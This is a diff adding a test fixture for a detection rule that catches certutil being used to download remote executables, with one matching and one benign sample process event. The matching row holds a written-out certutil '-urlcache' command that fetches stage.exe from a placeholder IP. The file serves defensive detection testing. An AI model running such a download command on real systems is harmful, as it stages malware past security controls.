@@ -1,0 +1,24 @@
+rule: detections/rules/lotl_certutil_remote_download.yaml
+table: DeviceProcessEvents
+positive_cases:
+  - name: Certutil downloading remote executable via urlcache
+    rows:
+      - Timestamp: "2026-10-16T01:00:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000018"
+        DeviceName: "ws-au-18.example.local"
+        AccountName: "jdoe"
+        InitiatingProcessFileName: "cmd.exe"
+        FileName: "certutil.exe"
+        ProcessCommandLine: "certutil.exe -urlcache -split -f https://198.51.100.18/stage.exe C:\\Temp\\stage.exe"
+        ReportId: 18001
+negative_cases:
+  - name: Certutil inspecting local machine certificate store
+    rows:
+      - Timestamp: "2026-10-16T01:05:00Z"
+        DeviceId: "00000000-0000-0000-0000-000000000018"
+        DeviceName: "ws-au-18.example.local"
+        AccountName: "admin"
+        InitiatingProcessFileName: "powershell.exe"
+        FileName: "certutil.exe"
+        ProcessCommandLine: "certutil.exe -store My"
+        ReportId: 18002
